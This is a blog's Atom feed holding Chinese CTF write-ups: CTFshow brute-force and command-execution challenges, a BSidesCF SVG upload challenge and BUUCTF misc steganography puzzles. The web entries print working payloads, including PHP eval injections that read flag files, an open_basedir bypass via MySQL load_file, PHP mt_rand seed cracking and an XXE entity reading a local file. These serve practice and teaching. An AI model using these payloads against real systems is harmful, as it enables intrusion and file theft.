<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Ro1ing.github.io</id>
    <title>Ro1ing</title>
    <updated>2021-06-08T12:36:19.797Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Ro1ing.github.io"/>
    <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
    <subtitle>To be patient.</subtitle>
    <logo>https://Ro1ing.github.io/images/avatar.png</logo>
    <icon>https://Ro1ing.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Ro1ing</rights>
    <entry>
        <title type="html"><![CDATA[CTFshow Web入门 爆破篇]]></title>
        <id>https://Ro1ing.github.io/post/ctfshow-web-ru-men-bao-po/</id>
        <link href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-bao-po/">
        </link>
        <updated>2021-06-08T00:15:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="爆破">爆破</h1>
<h2 id="web21">web21</h2>
<p><img src="https://Ro1ing.github.io/post-images/1623111458677.png" alt="" loading="lazy"><br>
authorization 为用户名：密码的base64加密<br>
<img src="https://Ro1ing.github.io/post-images/1623111469331.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1623111503905.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1623111510116.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1623111517759.png" alt="" loading="lazy"></p>
<h2 id="web22">web22</h2>
<p>域名也可以爆破的，试试爆破这个ctfer.com 的子域名<br>
爆破子域名 网站<br>
爆破到 flag.ctfshow.com<br>
跳转到<br>
flag.ctf<br>
得到flag</p>
<h2 id="web23">web23</h2>
<p>还爆破？这么多代码，告辞！</p>
<pre><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
error_reporting(0);

include('flag.php');
if(isset($_GET['token'])){
    $token = md5($_GET['token']);
    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){
        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?&gt;
</code></pre>
<p>不会做<br>
<img src="https://Ro1ing.github.io/post-images/1623111532058.png" alt="" loading="lazy"></p>
<pre><code>#coding: utf-8
import hashlib
dic =  &quot;0123456789qazwsxedcrfvtgbyhnujmikolp&quot;
md5 = hashlib.md5(dic.encode(&quot;utf-8&quot;)).hexdigest()
for a in dic:
    for b in dic:
        t = str(a)+str(b)
        md5 = hashlib.md5(t.encode(&quot;utf-8&quot;)).hexdigest()
        #print md5
        #print md5[1:2]
        #print md5[14:15]
        #print md5[17:18]
        if md5[1:2] == md5[14:15] and md5[14:15] ==md5[17:18]:
            print (t)
            print (md5)
            print (md5[1:2])
            print (md5[14:15])
            print (md5[17:18])

</code></pre>
<p>传递 后得到flag</p>
<h2 id="web24">web24</h2>
<p>PHP伪随机数</p>
<pre><code>&lt;?php
mt_srand(372619038);
echo(mt_rand());
?&gt;
</code></pre>
<p>用PHP版本7.2.10运行，将得到的数字传入即可</p>
<p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p>
<p>所以这里是 指定了种子 3722619038 所以生成的随机数是固定的 所以是伪随机数</p>
<h2 id="web25">web25</h2>
<pre><code>error_reporting(0);
include(&quot;flag.php&quot;);
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8)));
    $rand = intval($r)-intval(mt_rand());
    if((!$rand)){
        if($_COOKIE['token']==(mt_rand()+mt_rand())){
            echo $flag;
        }
    }else{
        echo $rand;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
</code></pre>
<p>当r=1时 rand=-1271936871<br>
mt_rand()=r-rand=1271936872<br>
现在使用 php_mt_seed 解密脚本</p>
<p>进入kali解压 进入目录<br>
<img src="https://Ro1ing.github.io/post-images/1623111546367.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1623111551517.png" alt="" loading="lazy"><br>
我这里用 7.1.0+ 所以使用 1874391185</p>
<pre><code>&lt;?php
mt_srand(1874391185);
echo mt_rand().&quot;\n&quot;;
echo mt_rand()+mt_rand();
</code></pre>
<pre><code>1271936872 3565333439
</code></pre>
<p>分别配置 r= token=<br>
mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 在之前自己还以为需要暴力破解cookie,最后师傅们给我介绍了一个脚本，专门用来跑mt_srand()种子和 mt_rand()随机数的 这里自己解释一下为什么每一次的mt_rand()+mt_rand()不是第一次的随机数相加？？ 因为生成的随机数可以说是一个线性变换（实际上非常复杂）的每一次的确定的但是每一次是不一样的，所以不能 进行第一次*2就得到mt_rand()+mt_rand() 使用说只要我们得到种子就可以在本地进行获得自己想要的值 解题：通过随机数来寻找种子 我们让 ?r=0 得到随机数。这里我得到的是 183607393 每一次不一样(因为flag值在变化) 然后下载 php_mt_seed4.0 我们在linux下面使用 gcc进行编译 gcc php_mt_seed.c -o php_mt_seed 之后运行脚本添加随机数 ./php_mt_seed 183607393<br>
找到对应的版本这里自己的运气好第一个出来的自己验证了一下发现就是这个 注：可能存在多个种子需要自己进行判断 通过种子找到第一个随机数就是上面的随机数</p>
<pre><code>payload： ?r=183607393 Cookie: token=794171094
</code></pre>
<h2 id="web26">web26</h2>
<p>ctfshow flag管理系统<br>
<img src="https://Ro1ing.github.io/post-images/1623111559288.png" alt="" loading="lazy"><br>
hint chrome浏览器抓包 暴力破解密码</p>
<pre><code>源代码：
function check(){ 	
	$.ajax({ 
	url:'checkdb.php', 
	type: 'POST', 
	dataType:'json', 
	data:{ 
	'a':$('#a').val(), 
	'p':$('#p').val(), 
	'd':$('#d').val(), 
	'u':$('#u').val(), 
	'pass':$('#pass').val() 
	}, 
	success:function(data){ 
	alert(data['msg']); 
	}, 
	error:function(data){ 
	alert(data['msg']); 
	} 
	}); 
	}
</code></pre>
<p><img src="https://Ro1ing.github.io/post-images/1623111592946.png" alt="" loading="lazy"><br>
参数全为 空 就出flag了为什么？？？<br>
直接post  checkdb.php就行了 -。-</p>
<h2 id="web27">web27</h2>
<p>方正教务系统<br>
有一份录取名单<br>
还有一个 query.php学院录取查询</p>
<pre><code>hint：
&lt;?php
//621022********5237
$myfile = fopen(&quot;zid.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
for($year=1990;$year&lt;1993;$year++){
for($mon=1;$mon&lt;10;$mon++){
for($day=01;$day&lt;10;$day++)
{
$txt=('621022'.$year.'0'.$mon.'0'.$day.'5237').&quot;\n&quot;;
fwrite($myfile, $txt);
}
}
} f
or($year=1990;$year&lt;1993;$year++){
for($mon=1;$mon&lt;10;$mon++){
for($day=10;$day&lt;=31;$day++)
{
$txt=('621022'.$year.&quot;0&quot;.$mon.$day.'5237').&quot;\n&quot;;
fwrite($myfile, $txt);
}
}
} f
or($year=1990;$year&lt;1993;$year++){
for($mon=10;$mon&lt;=12;$mon++){
for($day=10;$day&lt;=31;$day++)
{
$txt=('621022'.$year.$mon.$day.'5237').&quot;\n&quot;;
fwrite($myfile, $txt);
}
}
} f
or($year=1990;$year&lt;1993;$year++){
for($mon=10;$mon&lt;=12;$mon++){
for($day=01;$day&lt;10;$day++)
{
$txt=('621022'.$year.$mon.&quot;0&quot;.$day.'5237').&quot;\n&quot;;
fwrite($myfile, $txt);
}
}
} f
close($myfile);
</code></pre>
<p>wp 是通过 录取通知里面的带有**将其内容爆破</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTFshow Web入门 命令执行篇]]></title>
        <id>https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/</id>
        <link href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/">
        </link>
        <updated>2021-06-07T13:27:19.000Z</updated>
        <content type="html"><![CDATA[<h2 id="web66">web66</h2>
<pre><code>c=print_r(scandir('/'));
</code></pre>
<p>回显</p>
<pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )
</code></pre>
<pre><code>c=highlight_file('/flag.txt');
</code></pre>
<p>得到flag<br>
也可以使用文件包含</p>
<pre><code>c=include('/flag.txt');
c=require('/flag.txt');
c=require_once('/flag.txt');
</code></pre>
<blockquote>
<p>require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。此行为和require()语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含</p>
</blockquote>
<h2 id="web67">Web67</h2>
<pre><code>c=highlight_file('/flag.txt');
</code></pre>
<h2 id="web68">Web68</h2>
<pre><code>c=include('flag.php');echo $flag;
秀秀得了不在这
扫下根目录
c=print_r(scandir('/'));
print_r也被过滤了
换方法
c=var_dump(scandir('/'));
</code></pre>
<p>获得根目录 发现.txt</p>
<pre><code>array(21) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; }
</code></pre>
<pre><code>c=include(&quot;/flag.txt&quot;);//得到；没有php标签 所以使用html形式输出
</code></pre>
<h2 id="web69">Web69</h2>
<pre><code>c=include(&quot;/flag.txt&quot;);
</code></pre>
<h2 id="web70">Web70</h2>
<pre><code>Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14

Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15

Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
你要上天吗？
</code></pre>
<pre><code>c=include('/flag.txt');
</code></pre>
<h2 id="web71">Web71</h2>
<p>看index.php</p>
<pre><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();//得到输出缓冲区内容
        ob_end_clean();//清空缓冲区
        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);//对内容进行一个替换
}else{
    highlight_file(__FILE__);
}

?&gt;

你要上天吗？
</code></pre>
<p><img src="https://Ro1ing.github.io/post-images/1623072540529.jpg" alt="" loading="lazy"><br>
思路：在ob_get_contents()函数之前中断指令。</p>
<pre><code>c=include('/flag.txt');exit();
</code></pre>
<h2 id="web72">Web72</h2>
<pre><code>c=var_dump(scandir('/'));exit();
返回
Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
Warning: scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html/) in /var/www/html/index.php(19) : eval()'d code on line 1
Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/index.php(19) : eval()'d code on line 1
Warning: scandir(): (errno 1): Operation not permitted in /var/www/html/index.php(19) : eval()'d code on line 1
Warning: var_dump() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 1
</code></pre>
<pre><code>c=var_dump(scandir('/'));

???????: ?????_?????????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???_???() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???????(): ????_??????? ??????????? ?? ??????. ????(/) ?? ??? ?????? ??? ??????? ????(?): (/???/???/????/) ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???????(/): ?????? ?? ???? ???: ????????? ??? ????????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???????(): (????? ?): ????????? ??? ????????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???_????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? 你要上天吗？
</code></pre>
<p>查询不到根目录内容 发现很多函数都不能用了</p>
<pre><code>c=$a = &quot;glob:///*.txt&quot;;//根目录下所有txt
if($b = opendir($a)){
 while (($file = readdir($b))!== false) {//循环读取
  echo &quot;filename:&quot;.$file.&quot;\n&quot;;
}
closedir($b);//关闭
}
exit();
</code></pre>
<p>回显</p>
<pre><code>Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
filename:flag0.txt
</code></pre>
<p>然后采用脚本绕过<br>
72poc.php ctfshow群里有<br>
选中c后面的内容然后点击url编码<br>
<img src="assets/image-20210510210830-4ytgdcv.png" alt="" loading="lazy"><br>
这个脚本是国外的开源项目</p>
<h2 id="web73">Web73</h2>
<p>使用脚本</p>
<pre><code>Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 154
Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 154
UAF failed
</code></pre>
<p>strlen()函数被过滤<br>
使用自定函数代替</p>
<pre><code>&lt;?php
//strlen // 返回指定字符串的长度

function strlen_user($s) {
	return count(str_split($s));
}

echo strlen_user('abc');

?&gt;
</code></pre>
<p>写入poc 将 所有的strlen替换成strlen_user<br>
将其提交回显：</p>
<pre><code>Fatal error: Possible integer overflow in memory allocation (4162900904 * 32 + 32) in /var/www/html/index.php(19) : eval()'d code on line 30
</code></pre>
<p>内存溢出<br>
重新扫描一下可能读取的文件有问题</p>
<pre><code>c=$a = &quot;glob:///*.txt&quot;;//根目录下所有txt
if($b = opendir($a)){
 while (($file = readdir($b))!== false) {//循环读取
  echo &quot;filename:&quot;.$file.&quot;\n&quot;;
}
closedir($b);//关闭
}
exit();
#filename:flagc.txt
</code></pre>
<p>改一下<br>
还是产生溢出</p>
<pre><code>&lt;?php
//strlen // 返回指定字符串的长度

function strlen_user($s) {
    $rot=0;
    for ($i=0;$i&lt;100000;$i++){
        if($s[$i]){
            $ret=$ret+1;
        }
        else{
            break;
        }
    }
        return $ret;
}

?&gt;
</code></pre>
<p>替换；报错状态码502；题目流量被清洗了 题目问题。</p>
<h2 id="web74">Web74</h2>
<p>先查看当前目录文件<br>
根目录下 filename:flagx.txt</p>
<pre><code>c=include(&quot;/flagx.txt&quot;);exit();
</code></pre>
<h2 id="web75">Web75</h2>
<p>先使用 ((20210512195233-q5lu0du &quot;{{.text}}&quot;))</p>
<blockquote>
<p>filename:flag36.txt</p>
</blockquote>
<pre><code>```c=include(&quot;/flag36.txt&quot;);exit();
</code></pre>
<p>被拦截了<br>
Payload:</p>
<pre><code>try { $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); foreach ($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row) { echo ($row[0]) . &quot;|&quot;; } $dbh = null;
} catch (PDOException $e) { echo $e-&gt;getMessage(); exit(0);
}
exit(0);
</code></pre>
<p>数据库的连接是<strong>读配置文件</strong>得到的<br>
拿SQL语句来读文件绕过open_basedir和disable_function的姿势</p>
<h2 id="web76">Web76</h2>
<blockquote>
<p>filename:flag36d.txt</p>
</blockquote>
<pre><code>c=try { $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); foreach ($dbh-&gt;query('select load_file(&quot;/flag36d.txt&quot;)') as $row) { echo ($row[0]) . &quot;|&quot;; } $dbh = null;
} catch (PDOException $e) { echo $e-&gt;getMessage(); exit(0);
}
exit(0);
</code></pre>
<p>得到</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[BSidesCF 2019]SVGMagic]]></title>
        <id>https://Ro1ing.github.io/post/bsidescf-2019svgmagic/</id>
        <link href="https://Ro1ing.github.io/post/bsidescf-2019svgmagic/">
        </link>
        <updated>2021-06-02T07:57:19.000Z</updated>
        <content type="html"><![CDATA[<p>参考：https://www.rootnetsec.com/bsidessf-svgmagick/<br>
文件上传<br>
Convert SVG to PNG with Magic<br>
上传Png：</p>
<pre><code>Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
</code></pre>
<p>上传Svg：<br>
回显Svg源文件和转化后的png<br>
利用SVG任意读取本地文件</p>
<blockquote>
<p>/proc/self 表示本地当前路径</p>
</blockquote>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE note [
&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;
]&gt;
&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;
  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;
&lt;/svg&gt;
</code></pre>
<p>得到</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUCTF Misc题]]></title>
        <id>https://Ro1ing.github.io/post/buuctf-misc-/</id>
        <link href="https://Ro1ing.github.io/post/buuctf-misc-/">
        </link>
        <updated>2021-05-30T11:19:25.000Z</updated>
        <content type="html"><![CDATA[<p>大部分都是没有思路看wp得到，部分忘记收集源地址了，该题解方便自己回顾。</p>
<h2 id="swpu2019伟大的侦探">[SWPU2019]伟大的侦探</h2>
<p>#图像密码#<br>
<img src="https://Ro1ing.github.io/post-images/1622374148763.png" alt="" loading="lazy"></p>
<h2 id="actf新生赛2020outguess">[ACTF新生赛2020]outguess</h2>
<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1622374258407.png" alt="" loading="lazy"></figure>
<h2 id="安洵杯-2019吹着贝斯扫二维码">[安洵杯 2019]吹着贝斯扫二维码</h2>
<p>flag.zip中<br>
有注释<br>
GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY<br>
把这些其他文件后缀批量改为jpg发现是二维码<br>
拼出来<br>
BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32<br>
所以按照base32-&gt;base16-&gt;rot13-&gt;base85-&gt;base64-&gt;base85的顺序解密得到密码：<br>
看wp才知道是 rot13解密<br>
<a href="https://rot13.com/">https://rot13.com/</a></p>
<h2 id="gxyctf2019gakki">[GXYCTF2019]gakki</h2>
<p>binwalk 分离一个压缩包出来<br>
有密码 数字爆破 8864<br>
里面都是一些字符串数字<br>
字频分析</p>
<pre><code class="language-python"># gakki_exp.py
# Author : imagin
alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- ={}[]&quot;
f = open(&quot;flag.txt&quot;, &quot;r&quot;)
data = f.read()
result = {d:0 for d in alphabet}

def sort_by_value(d):
    items = d.items()
    backitems = [[v[1],v[0]] for v in items]
    backitems.sort(reverse=True)
    return [ backitems[i][1] for i in range(0,len(backitems))]

for d in data:
    for alpha in alphabet:
        if d == alpha:
            result[alpha] = result[alpha] + 1

print(sort_by_value(result))
</code></pre>
<h2 id="bjdctf-2ndtargz-y1ng">[BJDCTF 2nd]TARGZ-y1ng</h2>
<p>压缩包套娃<br>
脚本</p>
<pre><code class="language-python">import zipfile,os
def unzip(zipname):
    while True:
        passwd = zipname.split('.')[0]
        zf = zipfile.ZipFile(zipname,'r')
        zf.extractall(pwd=passwd.encode())
        os.remove(zipname)
        zipname = zf.namelist()[0]
        zf.close()
unzip(&quot;OKMIlLVft.tar.gz&quot;)
</code></pre>
<h2 id="actf新生赛2020ntfs数据流">[ACTF新生赛2020]NTFS数据流</h2>
<p>flag.zip里面都是一堆txt<br>
ntfs 数据流<br>
<img src="https://Ro1ing.github.io/post-images/1622374310430.png" alt="" loading="lazy"><br>
导出ACTF{AAAds_nntfs_ffunn?}</p>
<h2 id="我吃三明治">我吃三明治</h2>
<p>一张图片<br>
foremost 解出两张图片<br>
看wp说是 两张图片连接处 有类似与base32的</p>
<h2 id="swpu2019network">[SWPU2019]Network</h2>
<p>很多数字，只有四种类型<br>
63/127/191/255 将其各自转换为二进制</p>
<pre><code>00111111
01111111
10111111
11111111
</code></pre>
<p>只有前两位是变化的。这就是TTL隐写。<br>
写个脚本。取出前两位。重新组合。再以8位一组。转换为16进制字符。再将16进制字符转换为字符<br>
ttl解密脚本</p>
<pre><code>import binascii
f=open('1.txt','r')
s=''
for i in f.readlines():
    if i == &quot;63\r\n&quot;:
        a='00'
    if i == &quot;127\r\n&quot;:
        a='01'
    if i == &quot;191\r\n&quot;:
        a='10'
    if i == &quot;255\r\n&quot;:
        a='11'
    s+=a
data=''
for i in range(0,len(s),8):
    data+=chr(int(s[i:i+8],2))
data=binascii.unhexlify(data)
print(data)
</code></pre>
<p>得到一个压缩包，ZIP伪加密。修改得到一大串Base64</p>
<pre><code>import base64
f=open('flag.txt','r')
data=f.readlines()[0]
while True:
    data=base64.b64decode(data)
    if '{' in data:
        print data
        exit(0)
</code></pre>
<h2 id="安洵杯2019easy-misc">[安洵杯2019]easy misc</h2>
<p>参考：https://www.pythonheidong.com/blog/article/480228/53eba1f0463f049938d8/<br>
https://xz.aliyun.com/t/6911#toc-30<br>
decode.zip里面有</p>
<blockquote>
<p>FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,<br>
一个算术加NNULLULL,猜测可能考察掩码攻击<br>
前面的算术算出来是7，即也就是7+NNULLULL,<br>
<img src="https://Ro1ing.github.io/post-images/1622374519015.png" alt="" loading="lazy"><br>
学到了<br>
2019456NNULLULL<br>
foremost分离出两个一样的图片<br>
盲水印：<br>
<img src="https://Ro1ing.github.io/post-images/1622374631852.png" alt="" loading="lazy"><br>
提取出来 提示看 11.txt<br>
说明字频隐写在11.txt中，hint中提示取前16位即etaonrhsidluygw<br>
read文件夹内都是看不懂的东西</p>
</blockquote>
<pre><code>decode.txt
a = dIW
b = sSD
c = adE 
d = jVf
e = QW8
f = SA=
g = jBt
h = 5RE
i = tRQ
j = SPA
k = 8DS
l = XiE
m = S8S
n = MkF
o = T9p
p = PS5
q = E/S
r = -sd
s = SQW
t = obW
u = /WS
v = SD9
w = cw=
x = ASD
y = FTa
z = AE7
</code></pre>
<p>利用python脚本获取11.txt中前16高频字母<br>
字频分析脚本</p>
<pre><code>import re
file = open('C:/Users/Fiona/Desktop/11.txt')
line = file.readlines()
file.seek(0,0)
file.close()

result = {}
for i in range(97,123):
	count = 0
	for j in line:
		find_line = re.findall(chr(i),j)
		count += len(find_line)
	result[chr(i)] = count
res = sorted(result.items(),key=lambda item:item[1],reverse=True)
num = 1
for x in res:
	print('频数第{0}: '.format(num),x)
	num += 1 
</code></pre>
<p><img src="https://Ro1ing.github.io/post-images/1622374745952.png" alt="" loading="lazy"><br>
etaonrhsidluygw 替换 得到 QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw==<br>
base64</p>
<blockquote>
<p>Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms<br>
base85<br>
flag{have_a_good_day1}</p>
</blockquote>
<h2 id="rctf2019draw">[RCTF2019]draw</h2>
<pre><code>cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home
</code></pre>
<p>https://www.calormen.com/jslogo/ 解释器</p>
<h2 id="sctf2019电单车">[SCTF2019]电单车</h2>
<p>http://www.kb-iot.com/post/756.html</p>
<p><img src="https://Ro1ing.github.io/post-images/1622374780277.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622374783974.png" alt="" loading="lazy"><br>
长波为1，短波为0<br>
0111010010101010011000100<br>
看wp取前20位</p>
<h2 id="弱口令">弱口令</h2>
<p>放进sublime 查看<br>
<img src="https://Ro1ing.github.io/post-images/1622376703868.png" alt="" loading="lazy"><br>
换成摩斯<br>
.... .<br>
.-.. .-.. ----- ..-. --- .-. ..- --<br>
HELL0FORUM<br>
获得图片<br>
看wp才知道是 <strong>lsp隐写</strong><br>
<img src="https://Ro1ing.github.io/post-images/1622376719287.png" alt="" loading="lazy"><br>
根据提示弱口令进行猜测，当口令为123456可以分离出内容</p>
<figure data-type="image" tabindex="2"><img src="https://Ro1ing.github.io/post-images/1622376764716.png" alt="" loading="lazy"></figure>
<h2 id="guet-ctf2019zips">[GUET-CTF2019]zips</h2>
<p>文件头损害 伪加密 setup.sh<br>
<img src="https://Ro1ing.github.io/post-images/1622376785775.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622376793234.png" alt="" loading="lazy"><br>
掩码攻击<br>
flag.zip为掩码爆破，因为时间戳和出题当时不太一样所以往前推，<br>
利用ARCHPR设置掩码15???.?? 掩码符号为**?**<br>
<img src="https://Ro1ing.github.io/post-images/1622376836967.png" alt="" loading="lazy"></p>
<h2 id="wustctf2020girlfriend">[WUSTCTF2020]girlfriend</h2>
<p>#音频隐写#</p>
<p>打电话输入号码的声音，猜测DTMF拨号音识别，有个程序可以识别一下dtmf2num.exe<br>
<img src="https://Ro1ing.github.io/post-images/1622376886150.png" alt="" loading="lazy"><br>
<img src="https://Ro1ing.github.io/post-images/1622376850550.png" alt="" loading="lazy"></p>
<h2 id="actf新生赛2020明文攻击">[ACTF新生赛2020]明文攻击</h2>
<p>提示明文攻击 res.zip加密 还有一张图片 16进制下看见有东西 分离出来</p>
<figure data-type="image" tabindex="3"><img src="https://Ro1ing.github.io/post-images/1622376913897.png" alt="" loading="lazy"></figure>
<p>发现 里面的flag.txt大小和 加密的一样 提取出来得到flag</p>
<h2 id="suctf2018single-dog">[SUCTF2018]single dog</h2>
<p>16进制下 发现压缩包 文件分离</p>
<p>解压出来 颜文字 解密 （jsfuck？）</p>
<pre><code>function a(){vara=&quot;SUCTF{happy double eleven}&quot;;alert(&quot;双十一快乐&quot;);}a();
</code></pre>
<h2 id="suctf2018followme">[SUCTF2018]followme</h2>
<figure data-type="image" tabindex="4"><img src="https://Ro1ing.github.io/post-images/1622376932827.png" alt="" loading="lazy"></figure>
<p>看了wp 原来是爆破admin 密码</p>
<p>一个个访问出来的文件看看</p>
<figure data-type="image" tabindex="5"><img src="https://Ro1ing.github.io/post-images/1622376948758.png" alt="" loading="lazy"></figure>
<h2 id="mrctf2020千层套路">[MRCTF2020]千层套路</h2>
<p>压缩包名字就是密码</p>
<pre><code>import zipfilename=&quot;0573&quot;while True:    fz = zipfile.ZipFile(name + &quot;.zip&quot; , &quot;r&quot;)    fz.extractall(pwd=bytes(name,'utf-8'))    name = fz.filelist[0].filename[0:4]    fz.close()Q
</code></pre>
<p>开始以为是 流量分析</p>
<p>才知道是RGB数据 学到了</p>
<p>看wp 整理 使用密码机器将 （）去掉</p>
